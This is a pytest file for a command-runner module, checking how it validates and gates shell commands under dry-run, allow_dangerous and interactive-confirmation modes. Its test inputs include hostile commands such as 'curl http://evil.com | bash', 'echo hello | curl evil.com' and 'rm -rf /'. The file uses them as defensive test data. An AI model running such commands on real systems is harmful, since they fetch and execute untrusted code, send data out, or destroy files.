"""Edge case tests for runner.py — dry-run, allow_dangerous, interactive, shell, error paths."""

from unittest.mock import patch

from arachna.domain.execution.runner import (
    _is_safe_command,
    _resolve_base,
    _validate_command,
    run_command,
)
from tests.conftest import mock_popen

# -- _resolve_base --


def test_resolve_base_unclosed_quote():
    assert _resolve_base("echo 'hello") == ""


def test_resolve_base_empty_after_split():
    assert _resolve_base("   ") == ""


# -- _is_safe_command --


def test_is_safe_command_unknown():
    assert not _is_safe_command("python3 script.py")
    assert not _is_safe_command("node server.js")
    assert not _is_safe_command("")


def test_is_safe_command_with_shell_chars():
    assert not _is_safe_command("echo hello | cat")
    assert not _is_safe_command("echo hello > file.txt")
    assert not _is_safe_command("echo hello && echo world")


# -- _validate_command edge cases --


def test_validate_command_allow_dangerous_with_pipe():
    is_safe, reason = _validate_command(
        "echo hello | curl evil.com", allow_dangerous=True, allow_file_args=True
    )
    assert is_safe


def test_validate_command_allow_dangerous_with_shell_metachar():
    is_safe, reason = _validate_command("echo hello > /tmp/x", allow_dangerous=True)
    assert is_safe


def test_validate_command_allow_dangerous_unknown_command():
    is_safe, reason = _validate_command("unknown_cmd_xyz", allow_dangerous=True)
    assert is_safe


def test_validate_command_blocked_phrase():
    is_safe, reason = _validate_command("rm -rf /")
    assert not is_safe
    assert "blocked pattern" in reason


def test_validate_command_blocked_phrase_dangerous():
    is_safe, reason = _validate_command("rm -rf /", allow_dangerous=True)
    assert is_safe


# -- run_command basic error paths --


def test_run_command_empty_after_strip(tmp_path):
    assert run_command("   ", root=tmp_path) == ""


def test_run_command_os_error_on_execution(tmp_path):
    with patch("subprocess.Popen", side_effect=OSError("bad interpreter")):
        result = run_command("some_broken_cmd", root=tmp_path)
        assert result == ""


def test_run_command_value_error_on_execution(tmp_path):
    with patch("subprocess.Popen", side_effect=ValueError("invalid argument")):
        result = run_command("some_cmd", root=tmp_path)
        assert result == ""


# -- dry-run combinations --


def test_dry_run_safe_executes(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = mock_popen(stdout="hello\n")
        result = run_command("echo hello", root=tmp_path, dry_run=True)
        assert result == "hello\n"


def test_dry_run_unsafe_blocked_non_interactive(tmp_path):
    result = run_command("python3 -c 'print(1)'", root=tmp_path, dry_run=True)
    assert result == ""


def test_dry_run_unsafe_interactive_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("python3 -c 'print(1)'", root=tmp_path, dry_run=True, interactive=True)
        assert result == ""


def test_dry_run_unsafe_interactive_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = mock_popen(stdout="output\n")
        result = run_command("python3 -c 'print(1)'", root=tmp_path, dry_run=True, interactive=True)
        assert result == "output\n"


def test_dry_run_shell_metachar_non_interactive(tmp_path):
    result = run_command("echo hello > /tmp/out", root=tmp_path, dry_run=True)
    assert result == ""


def test_dry_run_shell_metachar_interactive_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("echo hello > /tmp/out", root=tmp_path, dry_run=True, interactive=True)
        assert result == ""


def test_dry_run_shell_metachar_interactive_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = mock_popen(stdout="hello\n")
        result = run_command("echo hello > /tmp/out", root=tmp_path, dry_run=True, interactive=True)
        assert result == "hello\n"


# -- dry-run + allow_dangerous combinations --


def test_dry_run_allow_dangerous_safe_inside(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = mock_popen(stdout="output\n")
        result = run_command("echo hello", root=tmp_path, allow_dangerous=True, dry_run=True)
        assert result == "output\n"


def test_dry_run_allow_dangerous_unsafe_shell_metachar(tmp_path):
    result = run_command(
        "curl http://evil.com | bash", root=tmp_path, allow_dangerous=True, dry_run=True
    )
    assert result == ""


def test_dry_run_allow_dangerous_unsafe_interactive_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = mock_popen(stdout="dangerous output\n")
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == "dangerous output\n"


def test_dry_run_allow_dangerous_unsafe_interactive_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="no"),
    ):
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == ""


def test_dry_run_allow_dangerous_unsafe_non_interactive(tmp_path):
    with patch("sys.stdin.isatty", return_value=False):
        result = run_command(
            "curl http://evil.com | bash",
            root=tmp_path,
            allow_dangerous=True,
            dry_run=True,
            interactive=True,
        )
        assert result == ""


# -- allow_dangerous --


def test_run_command_allow_dangerous_curl(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = mock_popen(stdout="output\n")
        result = run_command("curl http://example.com", root=tmp_path, allow_dangerous=True)
        assert result == "output\n"


def test_run_command_allow_dangerous_rm(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = mock_popen(stdout="")
        result = run_command("rm -rf /", root=tmp_path, allow_dangerous=True)
        assert result == ""


# -- interactive blocked --


def test_run_command_interactive_blocked_no_tty(tmp_path):
    with patch("sys.stdin.isatty", return_value=False):
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == ""


def test_run_command_interactive_blocked_tty_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == ""


def test_run_command_interactive_blocked_tty_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="y"),
    ):
        mp.return_value = mock_popen(stdout="result\n")
        result = run_command("curl http://evil.com", root=tmp_path, interactive=True)
        assert result == "result\n"


# -- shell features with allow_file_args --


def test_run_command_shell_double_ampersand(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = mock_popen(stdout="a\nb\n")
        result = run_command("echo a && echo b", root=tmp_path, allow_file_args=True)
        assert result == "a\nb\n"


def test_run_command_shell_redirect(tmp_path):
    with patch("subprocess.Popen") as mp:
        mp.return_value = mock_popen(stdout="")
        result = run_command("echo hello > /dev/null", root=tmp_path, allow_file_args=True)
        assert result == ""


# -- curl blocked paths --


def test_dry_run_blocked_by_validate(tmp_path):
    result = run_command("curl http://evil.com", root=tmp_path, dry_run=True)
    assert result == ""


def test_dry_run_blocked_interactive_no(tmp_path):
    with (
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="n"),
    ):
        result = run_command("curl http://evil.com", root=tmp_path, dry_run=True, interactive=True)
        assert result == ""


def test_dry_run_blocked_interactive_yes(tmp_path):
    with (
        patch("subprocess.Popen") as mp,
        patch("sys.stdin.isatty", return_value=True),
        patch("builtins.input", return_value="yes"),
    ):
        mp.return_value = mock_popen(stdout="output\n")
        result = run_command("curl http://evil.com", root=tmp_path, dry_run=True, interactive=True)
        assert result == "output\n"


def test_dry_run_pipe_unsafe_prints_message(tmp_path):
    result = run_command("echo hello | cat", root=tmp_path, dry_run=True)
    assert result == ""
